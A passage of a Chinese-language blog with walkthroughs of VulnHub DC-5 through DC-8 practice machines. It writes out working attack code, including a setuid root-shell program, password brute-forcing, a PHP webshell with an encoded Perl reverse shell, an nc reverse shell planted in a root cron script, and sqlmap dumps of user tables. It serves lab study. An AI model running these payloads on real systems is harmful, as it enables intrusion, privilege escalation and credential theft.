<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#include</span> &lt;stdio<span class="selector-class">.h</span>&gt;</span><br><span class="line">int <span class="selector-tag">main</span>(void)&#123;</span><br><span class="line">    <span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">seteuid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setegid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">execvp</span>(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后再编译</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.<span class="keyword">c</span></span><br><span class="line">gcc -o rootshell rootshell.<span class="keyword">c</span></span><br></pre></td></tr></table></figure>

<p>最后的脚本中把这些都删了，留下cd &#x2F;etc之后的命令即可，先在kali上开一下http服务</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python</span> -m http.server <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机的tmp目录上下载这三个文件</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cd</span> /etc</span><br><span class="line"><span class="attribute">wget</span> <span class="number">192.168.111.128:8888</span>/<span class="number">41154</span>.sh</span><br><span class="line"><span class="attribute">wget</span> <span class="number">192.168.111.128:8888</span>/libhax.so</span><br><span class="line"><span class="attribute">wget</span> <span class="number">192.168.111.128:8888</span>/rootshell</span><br><span class="line"><span class="attribute">chmod</span> <span class="number">777</span> <span class="number">41154</span>.sh                     //最后还要给脚本加上可执行的权限</span><br></pre></td></tr></table></figure>

<p>呃运行脚本报错了，说是靶机上没glibc 2.34库，就这样吧反正就这一步了不知道咋解决</p>
<h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>还是常规的一套流程，相比于前几个这个应该是算难得，难的点应该是外网的渗透要难点，但还是很基础</p>
<h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><p>官网下载：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-6.zip">https://download.vulnhub.com/dc/DC-6.zip</a></p>
<h2 id="信息收集-5"><a href="#信息收集-5" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -<span class="selector-tag">A</span> -<span class="selector-tag">p</span>- <span class="number">192.168</span>.<span class="number">111.138</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a352c9ccda6.png" alt="image-20240722231035171.png"></p>
<p>开了80端口的web服务和22端口的ssh，访问web服务发现是和DC2一样的有个重定向，在本地host文件中添加</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.111.138</span> wordy</span><br></pre></td></tr></table></figure>

<p>爆下ssh，看是不是弱密码</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> --script=ssh-brute <span class="number">192</span>.<span class="number">168</span>.<span class="number">1111</span>.<span class="number">138</span>      //--script=ssh-brute：运行一个名为ssh-brute的脚本</span><br></pre></td></tr></table></figure>

<p>爆了好久都没出来，dirsearch扫下目录有个后台的登录，web服务是wordpress，看到wordpress就想起打DC2了，wpscan爆破用户名结合cewl爆破密码</p>
<h2 id="渗透过程-2"><a href="#渗透过程-2" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>先用wpscan爆用户名</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan <span class="params">--url</span> http:<span class="string">//wordy</span> -e u</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a352c9d2ac8.png" alt="image-20240722233044919.png"></p>
<p>用户名存在一个txt中方便后续爆破，爆破密码的话可以不用cewl，官方有提示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a352c9f390d.png" alt="image-20240722233228790.png"></p>
<p>用kali自带的rockyou.txt中含有k01的密码作为爆破的字典，生成pass.txt</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt | <span class="keyword">grep</span> k01 &gt; <span class="regexp">/home/</span>kali<span class="regexp">/Desktop/</span>pass.txt</span><br></pre></td></tr></table></figure>

<p>用wpscan爆破</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan <span class="attr">--url</span> wordy -U user<span class="selector-class">.txt</span> -<span class="selector-tag">P</span> pass<span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Username:</span> <span class="string">mark,</span> <span class="attr">Password:</span> <span class="string">helpdesk01</span></span><br></pre></td></tr></table></figure>

<p>可以登录后台了，用这个尝试了下ssh，没连上，进来后发现有个插件，直接搜activity monitor插件漏洞就能搜到，管道符<code>|</code>后拼接任意命令rce</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a352c9cf55e.png" alt="image-20240722234930753.png"></p>
<p>直接弹shell了，但貌似这个网页输入有长度限制，抓个包改，拿到shell后还是弄个漂亮的交互式</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="keyword">c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<p>剩下就是提权了</p>
<h2 id="Linux提权-2"><a href="#Linux提权-2" class="headerlink" title="Linux提权"></a>Linux提权</h2><p>sudo -l啥都看不到，suid也不行，到处翻翻，在<code>/home/mark/stuff</code>目录下找到，有一个类似于备忘录的东西，我发现用户名目录下经常有东西</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a352c96bcd7.png" alt="image-20240722235904578.png"></p>
<p>说是加了个用户，呃不就是刚才爆出用户名的其中一个吗，su切换到graham用户下看看能不能提权吧，还是先sudo -l       </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a352c927159.png" alt="image-20240723000238480.png"></p>
<p>jens用户可以无密码命令执行文件backup.sh，看看这个文件啥内容</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a352ca3748c.png" alt="image-20240723000527944.png"></p>
<p>这个脚本作用是创建一个压缩包，我们可以再往该脚本最后中加个bash，这样结束了tar后会以jens用户的身份再起一个新的shell，这样就可以达到切换到jens用户的目的</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt;&gt; backups.sh              <span class="string">//</span>向sh文件中写入<span class="string">/bin/bash</span></span><br><span class="line">sudo -u jens <span class="string">./backups.sh</span>                   <span class="string">//</span>以jens用户身份执行sh文件</span><br></pre></td></tr></table></figure>

<p>切换到jens用户后sudo -l发现nmap可以无密码root权限运行，nmap提权：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zijiaijd/article/details/117165224">nmap提权</a></p>
<p>和vim提权原理差不多，就是创建个起shell的脚本，再让nmap以root权限运行</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;os.execute(&#x27;/bin/bash&#x27;)&quot;</span> &gt; <span class="keyword">shell</span>               //创建起<span class="keyword">shell</span>的脚本</span><br><span class="line">sudo <span class="keyword">nmap</span> --script=<span class="keyword">shell</span>                       </span><br></pre></td></tr></table></figure>

<p>最后拿flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a352cc85876.png" alt="image-20240723154838159.png"></p>
<h2 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h2><p>感觉比前面几个简单多了，就渗透多了点信息收集，感觉没思路的时候到处翻翻说不定翻到了一些忘删的账户密码啥的，信息收集真的很重要</p>
<h1 id="DC-7"><a href="#DC-7" class="headerlink" title="DC-7"></a>DC-7</h1><p>官网下载：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-7.zip">https://download.vulnhub.com/dc/DC-7.zip</a></p>
<h2 id="信息收集-6"><a href="#信息收集-6" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -<span class="selector-tag">A</span> -<span class="selector-tag">p</span>- <span class="number">192.168</span>.<span class="number">111.139</span></span><br></pre></td></tr></table></figure>

<p>开了80端口的web服务和22端口的ssh</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a3545165672.png" alt="image-20240726154614136.png"></p>
<p>扫目录没啥有用的，访问一下web服务</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a353991d617.png" alt="image-20240723163611768.png"></p>
<p>告诉我们不要暴力破解，要跳出思维惯性，左下角有个@DC7USER，搜一下就搜到了其github仓库，翻了下发现了账号密码（信息收集太重要了）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a35399186bb.png" alt="image-20240723163805660.png"></p>
<p>登不进后台，但能ssh连接</p>
<h2 id="渗透过程-3"><a href="#渗透过程-3" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>sudo -l啥都没有，看看suid</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>也没啥利用点，目录下有个mbox，打开看看，有个root用户的定时任务</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a353a0b97c9.png" alt="image-20240723165132348.png"></p>
<p>ls -al发现只有www-data和root能写入，弹不了root的shell了，如果登录上了www-data用户就可以将弹shell的命令写入定时任务再执行就可以弹root的shell了，先去看看定时任务干了些啥</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用 Drush 工具导出数据库，并将结果保存为 /home/dc7user/backups/website.sql</span></span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用 GPG 对 /home/dc7user/backups/website.sql 文件进行对称加密，并用指定的密码保护</span></span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#将 /home/dc7user/backups/ 目录下所有文件的所有者改为 dc7user  </span></span><br><span class="line"><span class="built_in">chown</span> dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.tar.gz</span><br></pre></td></tr></table></figure>

<p>drush是Drupal专属的一个操作命令，参考<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/60880048">Drupal drush 常用命令</a>，想直接解密的</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg <span class="attr">--output</span> website<span class="selector-class">.sql</span> <span class="attr">--decrypt</span> website<span class="selector-class">.sql</span><span class="selector-class">.gpg</span> </span><br></pre></td></tr></table></figure>

<p>但密码不对，drush可以直接改密码，要先切换到drupal的目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html</span><br></pre></td></tr></table></figure>

<p>改admin用户的密码</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush upwd admin --password<span class="operator">=</span><span class="string">&quot;passwd&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a35398bbe40.png" alt="image-20240723172150973.png"></p>
<p>访问<code>/user/login</code>路由登录进去，登进去后台就要找找rce的点了，要么写个webshell要么直接rce，在Content &#x3D;&gt; Add content &#x3D;&gt;Article处找到可以写个webshell，但是没有php解释器，可以下插件，在Extend &#x3D;&gt; Install new module中直接输php解释器Drupal官方链接：<code>https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz</code></p>
<p>install完后enable激活解释器，记得勾选，然后最下面install</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a35399138fe.png" alt="image-20240723173257118.png"></p>
<p>然后编辑就可以写php的webshell，还是写个php反弹shell的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">which</span>(<span class="params"><span class="variable">$pr</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$path</span> = <span class="title function_ invoke__">execute</span>(<span class="string">&quot;which <span class="subst">$pr</span>&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> (<span class="variable">$path</span> ? <span class="variable">$path</span> : <span class="variable">$pr</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$cfe</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$cfe</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">			@<span class="title function_ invoke__">exec</span>(<span class="variable">$cfe</span>,<span class="variable">$res</span>);</span><br><span class="line">			<span class="variable">$res</span> = <span class="title function_ invoke__">join</span>(<span class="string">&quot;\n&quot;</span>,<span class="variable">$res</span>);</span><br><span class="line">			&#125; </span><br><span class="line">			<span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line">			<span class="variable">$res</span> = @<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cfe</span>);</span><br><span class="line">			&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">system</span>(<span class="variable">$cfe</span>);</span><br><span class="line"><span class="variable">$res</span> = @<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">@<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">passthru</span>(<span class="variable">$cfe</span>);</span><br><span class="line"><span class="variable">$res</span> = @<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">@<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">&#125; <span class="keyword">elseif</span>(@<span class="title function_ invoke__">is_resource</span>(<span class="variable">$f</span> = @<span class="title function_ invoke__">popen</span>(<span class="variable">$cfe</span>,<span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$f</span>)) &#123;</span><br><span class="line"><span class="variable">$res</span> .= @<span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>,<span class="number">1024</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">pclose</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cf</span>(<span class="params"><span class="variable">$fname</span>,<span class="variable">$text</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$fp</span>=@<span class="title function_ invoke__">fopen</span>(<span class="variable">$fname</span>,<span class="string">&#x27;w&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>,@<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$text</span>));</span><br><span class="line">@<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$yourip</span> = <span class="string">&quot;192.168.111.128&quot;</span>;  <span class="comment">#监听ip</span></span><br><span class="line"><span class="variable">$yourport</span> = <span class="string">&#x27;2333&#x27;</span>;   <span class="comment">#监听端口</span></span><br><span class="line"><span class="variable">$usedb</span> = <span class="keyword">array</span>(<span class="string">&#x27;perl&#x27;</span>=&gt;<span class="string">&#x27;perl&#x27;</span>,<span class="string">&#x27;c&#x27;</span>=&gt;<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="variable">$back_connect</span>=<span class="string">&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;</span>.</span><br><span class="line"><span class="string">&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;</span>.</span><br><span class="line"><span class="string">&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;</span>.</span><br><span class="line"><span class="string">&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;</span>.</span><br><span class="line"><span class="string">&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;</span>.</span><br><span class="line"><span class="string">&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;</span>.</span><br><span class="line"><span class="string">&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">cf</span>(<span class="string">&#x27;/tmp/.bc&#x27;</span>,<span class="variable">$back_connect</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">execute</span>(<span class="title function_ invoke__">which</span>(<span class="string">&#x27;perl&#x27;</span>).<span class="string">&quot; /tmp/.bc <span class="subst">$yourip</span> <span class="subst">$yourport</span> &amp;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>点击保存后会自动执行该PHP代码，先监听端口再保存，也可以写马然后蚁剑连接再弹shell，拿到shell后，起个交互式shell</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="keyword">c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<p>将弹shell的命令写入定时任务中</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;nc 192.168.111.128 2334 -e /bin/bash&quot;</span> &gt;&gt; /<span class="keyword">opt</span>/scripts/backups.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>

<p>cd到root目录最后拿到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a353993e7c2.png" alt="image-20240723181557591.png"></p>
<h2 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h2><p>这个靶场又一次说明信息收集的重要性，感觉知识点不是特别难理解，定时任务在学redis未授权那也学过，目前学的提权的原理感觉都那样，就是找能以root权限运行的东西</p>
<h1 id="DC-8"><a href="#DC-8" class="headerlink" title="DC-8"></a>DC-8</h1><p>官网下载：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-8.zip">https://download.vulnhub.com/dc/DC-8.zip</a></p>
<h2 id="信息收集-7"><a href="#信息收集-7" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan</span><br><span class="line">nmap -<span class="selector-tag">A</span> -<span class="selector-tag">p</span>- <span class="number">192.168</span>.<span class="number">111.140</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a354c54581f.png" alt="image-20240724185329423.png"></p>
<p>又是只开了80端口web服务和22端口的ssh，看看web服务</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a354c54c93a.png" alt="image-20240724185512682.png"></p>
<p>drupal7和php，爆下ssh，没啥用</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> --script=ssh-brute <span class="number">192.168.111.140</span></span><br></pre></td></tr></table></figure>

<p>目录也没扫出啥有用的，只有个登录的地方<code>/user/login</code>，在点击Welcome to DC-8和Who We Are时会发现GET传参有个参数nid会变化，试了下万能密码，存在sql注入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a354c5bed5b.png" alt="image-20240724190202000.png"></p>
<h2 id="渗透过程-4"><a href="#渗透过程-4" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>sqlmap梭一下再说，先查下库名</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.111.140/?nid=1&quot;</span> <span class="params">--level=5</span> <span class="params">--risk=3</span> <span class="params">--batch</span> <span class="params">--dbs</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a354c4f412c.png" alt="image-20240724201932897.png"></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.111.140/?nid=1&quot;</span> <span class="attr">--level</span>=<span class="number">5</span> <span class="attr">--risk</span>=<span class="number">3</span> <span class="attr">--batch</span> -D <span class="string">&#x27;d7db&#x27;</span> -tables</span><br><span class="line">        <span class="comment">//查表</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.111.140/?nid=1&quot;</span> <span class="attr">--level</span>=<span class="number">5</span> <span class="attr">--risk</span>=<span class="number">3</span> <span class="attr">--batch</span> -D <span class="string">&#x27;d7db&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> -<span class="attribute">columns</span>        //查列</span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.111.140/?nid=1&quot;</span> <span class="attr">--level</span>=<span class="number">5</span> <span class="attr">--risk</span>=<span class="number">3</span> <span class="attr">--batch</span> -D <span class="string">&#x27;d7db&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> -C<span class="string">&#x27;name,pass,uid&#x27;</span> -dump        <span class="comment">//查字段</span></span><br></pre></td></tr></table></figure>

